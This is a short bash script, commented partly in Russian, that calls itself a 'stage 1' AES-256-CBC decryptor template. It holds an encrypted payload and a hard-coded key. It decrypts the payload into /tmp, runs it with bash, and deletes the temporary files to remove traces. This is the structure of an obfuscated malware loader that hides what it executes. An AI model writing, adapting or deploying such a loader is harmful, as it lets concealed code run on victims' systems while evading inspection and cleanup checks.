#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="366630c4c02d90f7f62c4342fb343963:6/5v5lTww2h/4OVPICvniAUNDeon3jp9lHtmGYmhq2+KbmY5qfP4FN1dPXOEAQnFHuqFMFF1TRtVdBZd28qyjVgML0cdyrrkjLspA9r3/go0YDxI3nCZ50rxx0b1pbtUVi94AhWUYoILcc0Hvv56izQRtLWegoqWHzidUd1QtQiGvyvcThNWiyuRnJu5YueE8OZe5DM4NH/l35fxlvbPzA1Lx0aiECisWQgKwBhzIrzSTWZD3TQpFFzEkyaMtvKPhhYY4IkfVzfzr5NhSBJf0Ubx0dDH4UWbSRXNJuudKqMnyPU59Xo3RhUr111t22gp5kGvOo1OimsnuE2PAJKFmcTnc+Znw9TaswJXBAm9sfGEb81G/HRzTRQ+e3nsOgBvslgNZGKdPH61r99FbLLrGX7JUJPKzkVcp0T2Y4CUH9v8BmprTjwSuwWo6gSGDeqfZPKtk1Ivi0SRIqApISFMdc/E4je+CYwdvCO6fqi6RLo="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
